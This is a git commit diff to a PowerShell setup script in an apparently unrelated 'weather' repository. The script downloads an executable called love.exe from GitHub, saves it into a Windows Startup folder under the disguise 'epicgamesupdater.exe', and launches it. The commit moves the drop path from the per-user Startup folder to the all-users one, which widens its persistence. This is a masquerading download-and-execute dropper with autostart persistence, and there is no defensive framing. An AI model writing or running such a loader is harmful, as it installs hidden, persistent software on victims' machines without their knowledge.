42c5373bb2a4491f1a018c9de8c48046e89590f3
FCsab <161705557+FCsab@users.noreply.github.com>
2026-01-09 13:00:18 +0100

    Update file paths in setup.ps1 script

--- setup.ps1
+++ setup.ps1
@@ -1,5 +1,6 @@
 $url = "https://github.com/FCsab/weather/blob/main/love.exe?raw=true"
-$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
+$dest = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
 Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
 Start-Process -FilePath $dest
 exit
+
